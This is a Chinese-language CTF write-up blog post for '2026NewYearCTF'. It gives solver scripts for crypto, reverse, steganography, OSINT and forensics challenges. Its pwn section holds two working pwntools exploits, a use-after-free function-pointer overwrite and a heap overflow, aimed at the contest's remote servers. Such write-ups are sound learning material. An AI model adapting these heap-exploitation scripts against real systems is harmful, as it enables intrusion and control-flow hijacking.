---
title: 2026NewYearCTF
slug: 2026newyearctf-22s8cc
url: /post/2026newyearctf-22s8cc.html
date: '2026-01-11 10:20:18+08:00'
lastmod: '2026-01-18 19:11:35+08:00'
categories:
  - CTF-Writeup
description: 神秘社工
toc: true
isCJKLanguage: true
---



# 2026NewYearCTF

# Beginner

## babyCrypto | 状态:solved｜Live

**题目描述**

**WriteUp**

```python
import json
import hmac
import hashlib
import itertools
import binascii
import sys

def solve():
    # Load dataset
    try:
        with open('dataset.json', 'r') as f:
            data = json.load(f)
    except FileNotFoundError:
        print("Error: dataset.json not found.")
        return

    dataset = data['dataset']
    flag_enc_hex = data['flag_enc']
    
    # We can use the first few messages to verify the salt
    # Using more than one checks to ensure we don't hit a collision on the truncated hash
    check_pairs = []
    for i in range(3): 
        if i < len(dataset):
            check_pairs.append((dataset[i]['message'].encode(), dataset[i]['mac']))

    print(f"Brute-forcing 3-byte salt...")

    found_salt = None

    # Iterate all 3-byte combinations (256^3 = ~16.7 million)
    # This might take a little bit of time but should be reasonably fast in Python for this size
    for salt_tuple in itertools.product(range(256), repeat=3):
        salt = bytes(salt_tuple)
        
        valid = True
        for msg, target_mac in check_pairs:
            # Calculate HMAC-SHA256
            h = hmac.new(salt, msg, hashlib.sha256)
            digest = h.digest()
            
            # Truncate to 4 bytes (8 hex chars)
            calculated_mac = digest[:4].hex()
            
            if calculated_mac != target_mac:
                valid = False
                break
        
        if valid:
            found_salt = salt
            break

    if found_salt:
        print(f"Found salt (hex): {found_salt.hex()}")
        
        # Decrypt flag
        # flag_enc is XOR(flag, salt repeated)
        flag_enc = bytes.fromhex(flag_enc_hex)
        flag = bytearray()
        for i in range(len(flag_enc)):
            flag.append(flag_enc[i] ^ found_salt[i % len(found_salt)])
        
        try:
            print(f"Flag: {flag.decode('utf-8')}")
        except UnicodeDecodeError:
            print(f"Flag (raw bytes): {flag}")
    else:
        print("Salt not found.")

if __name__ == "__main__":
    solve()

```

## babyStegano | 状态:solved｜Live

**题目描述**

**WriteUp**

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20260111102840-4r8zm0b.png)

## babyReverse | 状态:solved｜Live

**题目描述**

**WriteUp**

```python
def swaper(s: list, k: int):
    n = len(s)
    i = 0
    while i < n - k:
        s[i], s[i + k - 1] = s[i + k - 1], s[i]
        i += k

def decrypt(out):
    s = list(out)
    for k in range(2, 11):  # 逆顺序
        swaper(s, k)
    return ''.join(s)

cipher = "ro1dnEoSeT{Sth_rgA_01r!G4trnvF#lm_L)#@#(m#}"
print(decrypt(cipher))
# grodno{StArT_Ever1th1nG_Fr0m_Sm4lL#!##@(#)}
```

## babyOSINT | 状态:solved｜Live

**题目描述**

**WriteUp**

杯子上明显能看到 “​**Spichki Bar**” 的标志，这正是这个连锁酒吧的出品图（就像他们社交账户里发的那样）。

而且在 Instagram 上确实有一个账号是 ​**spichki.grodno**，发布于 ​**December 30, 2023**（正是你说的那张图片那天附近）。

所以这张照片很可能是从 **Spichki Bar 在 Гродно (Grodno)**  的分店拍的。

根据现有公开信息：

📍 **Spichki bar** 是连锁中的一间，但它是在 ​**明斯克 (Minsk)** 。不过 Instagram 上的 **spichki.grodno** 页面显示实际有一个 ​**Гродно 分店**。

现有 spichki.by 官网列出了多家 Spichki 酒吧，其中包括：

- Минск Комсомольская, 5А
- Минск Независимости, 95  
  … 等等，但​**没有官网明确列出 Grodno 分店地址**。

不过根据 Instagram 发布内容，这个 Grodno 分店的地址是：

📍 ​**Spichki Bar, пл. Советская, 2а, Grodno, Belarus**（俄语是 “пл. Советская, 2а” \= ​**Sovetskaya Square 2A**）

结合Flag格式要求，正确格式应该是：

```
grodno{Sovetskaya_Square_2A}
```

# Reverse

## Grinch Attack | 状态:solved｜Live

**题目描述**

**WriteUp**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  int i; // [rsp+4h] [rbp-19Ch]
  char v6[32]; // [rsp+20h] [rbp-180h] BYREF
  char s1[80]; // [rsp+40h] [rbp-160h] BYREF
  char s[264]; // [rsp+90h] [rbp-110h] BYREF
  unsigned __int64 v9; // [rsp+198h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  puts("The hint for the task in the description.Good luck");
  fgets(s, 256, edata);
  s[strcspn(s, "\n")] = 0;
  v3 = strlen(s);
  SHA256(s, v3, v6);
  for ( i = 0; i <= 31; ++i )
    sprintf(&s1[2 * i], "%02x", (unsigned __int8)v6[i]);
  s1[64] = 0;
  if ( !strcmp(s1, "a51d01f815964002e2ddcc2b778ce44a10a3fb50eadaac2ef4d6e24df9e466d4") )
  {
    puts("You are right but maybe you need something special?");
  }
  else if ( !strcmp("6abe48fdc061c32682db70edc6aea5d2eccbe4a7ed0579324f1370eca5a33c4e", s1) )
  {
    puts("Congratulations,you got it");
    printf("The flag is grodno{%s}\n", s);
  }
  else
  {
    puts("Nope");
  }
  return 0;
}
```

好吧，我在国内还是没见过那么抽象的题，小脑萎缩了，这做不出来真是心服口服了

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20260111180600-j42ok78.png)这能出来也是没招了🤡

## Happy New Year | 状态:solved｜Live

**题目描述**

**WriteUp**

```python
encrypted = [
    0x00, 0xD0, 0x30, 0x70, 0x28, 0x18, 0xB0, 0x31,
    0x70, 0x00, 0x08, 0x1A, 0x61, 0xD1, 0x80, 0x08,
    0x41, 0x09, 0x42, 0xF8, 0xD0, 0x70, 0xF2, 0xC2,
    0xF9, 0x55, 0x06, 0x36, 0x4D, 0x15, 0x2E, 0x65,
    0x25, 0x75, 0xA7
]

def ror3(x):
    return ((x >> 3) | (x << 5)) & 0xff

flag = ""
for i, b in enumerate(encrypted):
    x = ror3(b)
    x ^= (103 + i) & 0xff
    flag += chr(x)

print(flag)
# grodno{Happ1_New_Y1ear#&@*AD*&@*#&}
```

‍

# Stegano

## Santa’s Report | 状态:solved｜Live

**题目描述**

**WriteUp**

word直接解压。然后strings搜唯一的一张图片就直接得到flag了

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20260111182947-k16r3yv.png)

# Forensics

## exFill | 状态:solved｜Live

**题目描述**

**WriteUp**

在流量包里

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20260111173032-0nkrsck.png)

结果把后面那段base一转就可以了？emmmm

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20260111172951-2iiuva7.png)

# Crypto

## CryBaby | 状态:solved｜Live

**题目描述**

**WriteUp**

```python
import base64
import binascii
import string

def is_hex(b: bytes) -> bool:
    try:
        s = b.decode().lower()
        return len(s) % 2 == 0 and all(c in "0123456789abcdef" for c in s)
    except:
        return False

def peel_layers(data: bytes) -> bytes:
    cur = data.strip()
    for depth in range(1, 100):
        if len(cur) == 14:
            print(f"[+] Decoded in {depth} layers")
            return cur

        if is_hex(cur):
            try:
                cur = binascii.unhexlify(cur)
                continue
            except:
                pass

        try:
            nxt = base64.b64decode(cur)
            if nxt != cur:
                cur = nxt
                continue
        except:
            pass

        break

    raise ValueError("[-] Failed to peel to 14 bytes")

def main():
    with open("chall.txt", "rb") as f:
        data = f.read()

    print("[*] Loaded chall.txt, size =", len(data))

    xored = peel_layers(data)
    print("[*] XOR bytes:", xored.hex())

    prefix = b"grodnogrodno{"
    assert len(prefix) == 13

    CANDIDATES = b"abcdefghijklmnopqrstuvwxyz0123456789_"

    for c in CANDIDATES:
        L = prefix + bytes([c])   # 13 + 1 = 14
        R = bytes([L[i] ^ xored[i] for i in range(14)])
        flag = L + R

        try:
            s = flag.decode()
        except:
            continue

        if s.startswith("grodnogrodno{") and s.endswith("}"):
            print("[+] FLAG:", s)
            return

    print("[-] No valid flag found")

if __name__ == "__main__":
    main()

```

## ChristmasRSA | 状态:solved｜Live

**题目描述**

**WriteUp**

```python
from Crypto.Util.number import long_to_bytes

p = 13169078694919460635383928661575625181169334864757438398298903709298420936524007827607439606306140217827957404989078103821793651547869206591987281962796681
c = 3630107265622722432860113718901227107257778462530970277748300894821302240644191624151434409347535008286845806413323174289707080608209343558324355802697978

def tonelli_shanks(n, p):
    assert pow(n, (p - 1) // 2, p) == 1
    if p % 4 == 3:
        return pow(n, (p + 1) // 4, p)

    q = p - 1
    s = 0
    while q % 2 == 0:
        s += 1
        q //= 2

    z = 2
    while pow(z, (p - 1) // 2, p) != p - 1:
        z += 1

    m = s
    c = pow(z, q, p)
    t = pow(n, q, p)
    r = pow(n, (q + 1) // 2, p)

    while t != 1:
        i = 0
        tmp = t
        while tmp != 1:
            tmp = pow(tmp, 2, p)
            i += 1
        b = pow(c, 1 << (m - i - 1), p)
        m = i
        c = pow(b, 2, p)
        t = (t * c) % p
        r = (r * b) % p
    return r

# 第一次开根：得到 m^2
r1 = tonelli_shanks(c, p)
r2 = p - r1

# 第二次开根：得到 m
candidates = []
for y in (r1, r2):
    if pow(y, (p - 1) // 2, p) == 1:
        x = tonelli_shanks(y, p)
        candidates.extend([x, p - x])

for m in candidates:
    try:
        flag = long_to_bytes(m)
        if b"{" in flag:
            print(flag)
    except:
        pass

```

# Pwn

## name | 状态:solved｜Live

**题目描述**

**WriteUp**

程序存在堆 Use-After-Free 漏洞。释放 session 对象后未将指针置空，导致已释放的堆块被再次分配并覆盖其中的函数指针，最终在调用该函数指针时实现控制流劫持。

```python
from pwn import *

context.binary = './name'
context.log_level = 'debug'

# p = process('./name')
p = remote('ctf.mf.grsu.by', 9070)
elf = ELF('./name')

admin = elf.symbols['admin_shell']
log.success(f"admin_shell @ {hex(admin)}")

def menu(i):
    p.sendlineafter(b'> ', str(i).encode())

# 1. create session
menu(1)
p.sendafter(b'Enter name: ', b'test\n')

# 2. delete session (UAF)
menu(2)

# 3. leave feedback (overwrite function pointer)
menu(3)
payload = b'A'*0x18 + p64(admin)
p.send(payload)

# 4. trigger
menu(4)

p.interactive()

```

## taste | 状态:solved｜Live

**题目描述**

**WriteUp**

基础堆溢出

```python
from pwn import *

context.log_level = 'info'

p = remote('ctf.mf.grsu.by', 9071)

p.recvuntil(b'Enter name:')

payload  = b'A' * 0x10
payload += b'B' * 0x10
payload += b'C' * 4
payload += p32(0xDEADBEEF)

p.send(payload)

p.interactive()
```
